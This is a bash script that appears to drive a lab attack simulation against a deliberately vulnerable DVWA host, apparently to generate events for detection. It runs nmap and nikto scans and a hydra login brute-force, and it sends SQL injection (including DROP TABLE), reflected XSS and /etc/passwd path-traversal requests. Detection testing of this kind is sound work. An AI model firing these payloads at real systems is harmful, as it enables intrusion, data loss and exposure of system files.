#!/usr/bin/env bash
# Controlled attack simulation against the lab's own DVWA.
# Runs from the jumpbox against the private target. Nothing leaves the VCN.
set -uo pipefail

TARGET="${1:?usage: run-attacks.sh <victim-private-ip>}"
BASE="http://${TARGET}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STAMP="$(date -Is)"

log() { echo "[$(date -Is)] $*"; }

log "=== Attack run against ${TARGET} ==="

# 1. Port / service discovery
log "nmap service scan"
nmap -sV -T3 --top-ports 100 "${TARGET}" >/dev/null 2>&1 || true

# 2. Web vulnerability scan
log "nikto web scan"
timeout 300 nikto -host "${BASE}" -maxtime 240s >/dev/null 2>&1 || true

# 3. Brute-force the login (expected to fail — generates auth-failure events)
log "hydra login brute-force"
timeout 120 hydra -l admin -P "${DIR}/passwords.txt" \
  "${TARGET}" http-get-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  >/dev/null 2>&1 || true

# 4. Manual injection probes (single requests, easy to spot in logs)
log "SQL injection probes"
curl -s "${BASE}/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" -o /dev/null || true
curl -s "${BASE}/vulnerabilities/sqli/?id=1;DROP+TABLE+users--&Submit=Submit" -o /dev/null || true

log "XSS probes"
curl -s "${BASE}/vulnerabilities/xss_r/?name=<script>alert(1)</script>" -o /dev/null || true

log "Path traversal probe"
curl -s "${BASE}/vulnerabilities/fi/?page=../../../../etc/passwd" -o /dev/null || true

log "=== Attack run complete ==="
